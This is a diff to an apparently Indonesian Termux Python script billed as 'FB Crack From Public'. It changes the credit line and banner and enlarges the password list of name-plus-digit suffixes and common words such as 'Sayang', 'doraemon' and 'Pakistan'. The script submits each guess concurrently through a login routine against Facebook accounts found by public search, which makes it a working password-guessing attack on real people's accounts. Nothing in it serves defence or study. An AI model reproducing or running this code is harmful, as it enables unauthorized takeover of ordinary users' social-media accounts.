@@ -1,7 +1,7 @@
-#Creator:Fahmiapz
+#Recode by Neon Mixtape Tour
 #Date:19/09/2020
 #time:23:00
-#Recode Teros Boss Tinggal Pake Apa Susahnya Anjeng
+#Termux FarFuture
 import requests,re,os,sys,time,json,random,urllib,mechanize
 from requests.exceptions import ConnectionError
 from time import sleep as timeout
@@ -10,7 +10,7 @@ from concurrent.futures import ThreadPoolExecutor
 def clear():
     os.system('clear')
 def baner():
-    print('\t\033[91m~\033[94mFB\033[00m Crack From Public\033[91m~\033[00m\n')
+    print('\t\033[91m~\033[94mFB\033[00m Retakan Dari Publik\033[91m~\033[00m\n')
     print('\t\033[93m<\033[90m--------------------\033[93m>\033[00m')
 die=0
 chek=0
@@ -95,14 +95,34 @@ def search():
                          str(x)+'123',
                          str(x)+'1234',
                          str(x)+'12345',
-                         str(x)+'123456'
+                         str(x)+'123456',
+                         str(x)+'1234567',
+                         str(x)+'12345678',
+                         str(x)+'123456789'
                          ]
                  litpas.append('Sayang')
                  litpas.append('Bangsat')
                  litpas.append('Kontol')
                  litpas.append('Anjing')
+                 litpas.append('sayang')
+                 litpas.append('bangsat')
+                 litpas.append('kontol')
+                 litpas.append('doraemon')
+                 litpas.append('Doraemon')
+                 litpas.append('bintang')
+                 litpas.append('Bintang')
+                 litpas.append('indonesia')
+                 litpas.append('Indonesia')
+                 litpas.append('sunmori')
+                 litpas.append('Sunmori')
                  litpas.append('786786')
                  litpas.append('Bangladesh')
+                 litpas.append('Pakistan')
+                 litpas.append('786love')
+                 litpas.append('love786')
+                 litpas.append('pakistan')
+                 litpas.append('bangladesh')
+                 litpas.append('androind')
                  for passw in set(litpas):
                      ex.submit(login,(users[1]),(passw))
 
